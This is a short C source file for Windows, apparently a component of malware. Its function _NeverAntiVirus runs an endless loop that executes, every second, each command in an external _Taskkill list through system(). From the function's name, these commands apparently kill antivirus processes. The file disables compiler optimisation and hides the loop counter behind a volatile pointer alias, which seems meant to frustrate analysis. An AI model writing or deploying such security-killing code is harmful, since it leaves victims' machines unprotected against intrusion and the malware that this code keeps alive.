#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _NeverAntiVirus(void)
{
    // Alias local variable task_index
    volatile int task_index_buf[2] = {{0, (int)0}};
    volatile int *p_task_index = (volatile int *)&task_index_buf[0];

    do {
        for ((*p_task_index) = 0; _Taskkill[(*p_task_index)] != NULL; (*p_task_index)++) {
            system(_Taskkill[(*p_task_index)]);
        }
        Sleep(1000);
    } while(1);
}
#pragma optimize("", on)
